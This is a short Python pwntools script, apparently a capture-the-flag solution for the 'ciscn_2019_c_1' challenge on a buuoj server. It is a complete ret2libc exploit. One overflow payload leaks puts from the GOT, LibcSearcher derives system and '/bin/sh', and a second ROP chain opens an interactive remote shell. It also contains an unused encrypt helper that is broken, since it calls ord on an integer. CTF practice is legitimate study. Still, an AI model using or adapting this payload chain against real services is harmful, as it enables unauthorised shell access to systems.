from pwn import *
from LibcSearcher import *
#context.log_level='debug'       #方便调试
def encrypt(s):
    newstr=""
    for i in range(len(s)):
        c=ord(i)
        if c<=96 or c>122:
            if c<=64 or c>90:
                if c>47 and c<=57:
                    c^=0xF
            else:
                c^=0xE
        else:
            c^=0xD
        newstr+=chr(c)

    return newstr

p=remote("node4.buuoj.cn",25575)
elf=ELF('ciscn_2019_c_1')
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
start_addr=elf.symbols["_start"]
pop_rdi_addr=0x400c83

p.recvuntil("!\n")
p.sendline("1")
p.recvuntil("ed\n")

payload1=b"A"*88+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)
p.sendline(payload1)
p.recvuntil("Ciphertext\n")
p.recvuntil("\n")

puts_addr=u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00'))

libc=LibcSearcher("puts",puts_addr)
libcbase=puts_addr-libc.dump("puts")
system_addr=libcbase+libc.dump("system")
binsh_addr=libcbase+libc.dump("str_bin_sh")

p.recvuntil("!\n")
p.sendline("1")
p.recvuntil("ed\n")

ret_addr=0x4006b9
payload2=b"A"*88+p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)
p.sendline(payload2)

p.interactive()
